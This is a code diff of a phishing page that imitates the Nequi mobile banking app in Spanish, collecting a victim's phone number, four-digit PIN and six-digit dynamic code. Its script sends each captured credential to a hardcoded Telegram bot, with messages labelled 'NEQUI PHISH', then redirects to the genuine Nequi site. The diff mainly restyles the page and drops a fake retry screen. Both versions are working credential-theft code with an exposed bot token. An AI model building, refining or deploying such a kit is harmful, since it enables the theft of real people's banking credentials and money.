@@ -16,6 +16,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
+      overflow: hidden;
     }
 
     .phone-frame {
@@ -33,11 +34,12 @@
       width: 100%;
       height: 100%;
       padding: 20px;
+      background: #1F0829;
       display: none;
       flex-direction: column;
-      background: #1F0829;
     }
-    #screen1 { display: flex; }
+
+    #screen1 { display: flex !important; }
 
     .help {
       position: absolute;
@@ -60,7 +62,12 @@
     }
     .nequi-logo span { color: #FF2D95; margin-right: 8px; }
 
-    .label { text-align: center; margin: 70px 0 35px 0; font-size: 17.5px; color: #D8B5E8; }
+    .label { 
+      text-align: center; 
+      margin: 70px 0 35px 0; 
+      font-size: 17.5px; 
+      color: #D8B5E8; 
+    }
 
     .input-box {
       background: #2C1642;
@@ -94,8 +101,7 @@
 
     .back {
       position: absolute;
-      top: 25px;
-      left: 20px;
+      top: 25px; left: 20px;
       font-size: 30px;
       cursor: pointer;
     }
@@ -108,20 +114,20 @@
     }
 
     .pins {
-      margin: 50px 0 30px 0;
+      margin: 55px 0 35px 0;
       display: flex;
       justify-content: center;
-      gap: 18px;
+      gap: 20px;
     }
     .pin {
-      width: 48px;
-      height: 48px;
+      width: 50px;
+      height: 50px;
       background: #E0B0FF;
       border-radius: 10px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 26px;
+      font-size: 28px;
       color: #3C0A55;
     }
 
@@ -154,12 +160,6 @@
     .key:active { background: rgba(255,255,255,0.25); }
     .delete { font-size: 26px !important; }
 
-    /* Loader */
-    #loader {
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-    }
     .spinner {
       width: 55px;
       height: 55px;
@@ -170,25 +170,6 @@
       margin-bottom: 25px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-
-    /* Error Screen */
-    #errorScreen {
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      display: none;
-    }
-    .error-text {
-      color: #FF4D4D;
-      font-size: 20px;
-      margin-bottom: 15px;
-    }
-    .attempts {
-      color: #FF2D95;
-      font-size: 16px;
-      margin-top: 20px;
-    }
   </style>
 </head>
 <body>
@@ -238,7 +219,7 @@
         <div class="pin"></div><div class="pin"></div><div class="pin"></div>
         <div class="pin"></div><div class="pin"></div><div class="pin"></div>
       </div>
-      <div class="message" id="dynamicMessage">Ingresa el código de 6 dígitos<br>que te enviamos por SMS</div>
+      <div class="message">Ingresa el código de 6 dígitos<br>que aparece en la app</div>
       <div class="keyboard">
         <div class="key" onclick="addDigit(1,6)">1</div>
         <div class="key" onclick="addDigit(2,6)">2</div>
@@ -258,67 +239,65 @@
     <!-- Loader -->
     <div class="screen" id="loader">
       <div class="spinner"></div>
-      <div class="loader-text">Verificando clave dinámica...</div>
-    </div>
-
-    <!-- Pantalla de Error (Clave Dinámica Errada) -->
-    <div class="screen" id="errorScreen">
-      <div class="error-text">Clave dinámica errada</div>
-      <div class="message">El código ingresado no es correcto.<br>Por favor intenta nuevamente.</div>
-      <button onclick="retryDynamic()" style="margin-top:50px;">Intentar de nuevo</button>
-      <div class="attempts" id="attemptsText">Intentos restantes: 3</div>
+      <div style="text-align:center; font-size:18px; margin-top:20px;">Verificando información...</div>
     </div>
 
   </div>
 
   <script>
     let phoneNumber = "";
-    let dynamicAttempts = 3;
     let currentPin = "";
     let currentLength = 4;
+
     const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
     const chatId = "773351137";
 
     function goToPassword() {
       const phone = document.getElementById("phone").value.trim();
       if (phone.length < 9) return alert("Por favor ingresa un número válido");
+      
       phoneNumber = phone;
-      showScreen(2);
+      showScreen('screen2');
     }
 
-    function showScreen(screen) {
-      document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
-      document.getElementById(screen).style.display = 'flex';
+    function showScreen(screenId) {
+      document.querySelectorAll('.screen').forEach(screen => {
+        screen.style.display = 'none';
+      });
+      document.getElementById(screenId).style.display = 'flex';
 
-      if (screen === 'screen3') {
-        currentLength = 6;
+      if (screenId === 'screen2' || screenId === 'screen3') {
+        currentLength = (screenId === 'screen2') ? 4 : 6;
         currentPin = "";
         updatePins();
       }
     }
 
-    function addDigit(num, length) {
-      if (currentPin.length < length) {
+    function addDigit(num, expectedLength) {
+      if (currentPin.length < expectedLength) {
         currentPin += num;
         updatePins();
-        if (currentPin.length === length) sendData();
+        if (currentPin.length === expectedLength) {
+          sendToTelegram();
+        }
       }
     }
 
-    function deleteDigit(length) {
+    function deleteDigit() {
       currentPin = currentPin.slice(0, -1);
       updatePins();
     }
 
     function updatePins() {
-      const id = currentLength === 4 ? "pins4" : "pins6";
-      const boxes = document.querySelectorAll("#" + id + " .pin");
-      boxes.forEach((box, i) => box.textContent = i < currentPin.length ? "●" : "");
+      const container = currentLength === 4 ? "pins4" : "pins6";
+      const pins = document.querySelectorAll(`#${container} .pin`);
+      pins.forEach((pin, i) => {
+        pin.textContent = i < currentPin.length ? "●" : "";
+      });
     }
 
-    function sendData() {
+    function sendToTelegram() {
       const tipo = currentLength === 4 ? "Clave Principal" : "Clave Dinámica";
-      
       const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 ${tipo}: ${currentPin}\n⏰ ${new Date().toLocaleString('es-CO')}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -327,35 +306,15 @@
         body: JSON.stringify({ chat_id: chatId, text: message })
       });
 
-      if (currentLength === 4) {
-        showScreen('loader');
-        setTimeout(() => showScreen('screen3'), 1800);
-      } else {
-        // Clave Dinámica ingresada
-        showScreen('loader');
-        setTimeout(() => {
-          showErrorScreen();
-        }, 2200);
-      }
-    }
+      showScreen('loader');
 
-    function showErrorScreen() {
-      dynamicAttempts--;
-      document.getElementById('attemptsText').textContent = `Intentos restantes: ${dynamicAttempts}`;
-      showScreen('errorScreen');
-
-      if (dynamicAttempts <= 0) {
-        setTimeout(() => {
+      setTimeout(() => {
+        if (currentLength === 4) {
+          showScreen('screen3');        // Va correctamente a Clave Dinámica
+        } else {
           window.location.href = "https://www.nequi.com.co";
-        }, 2500);
-      }
-    }
-
-    function retryDynamic() {
-      if (dynamicAttempts > 0) {
-        currentPin = "";
-        showScreen('screen3');
-      }
+        }
+      }, 2200);
     }
 
     function goBack(from) {
